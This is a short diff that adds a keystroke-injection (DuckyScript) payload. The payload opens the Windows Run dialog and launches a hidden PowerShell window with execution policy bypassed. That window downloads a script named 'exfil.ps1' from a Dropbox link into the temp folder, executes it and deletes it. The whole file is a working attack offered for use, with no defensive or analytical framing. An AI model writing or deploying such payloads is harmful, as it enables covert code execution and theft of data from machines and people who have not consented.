@@ -1,0 +1,5 @@
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass \"\$e=\\\"\$env:TMP/e.ps1\\\"\;iwr https://www.dropbox.com/s/lgobous8d7fut56/exfil.ps1?dl=1 -O \$e\;iex \$e\;rm \$e\"
+ENTER
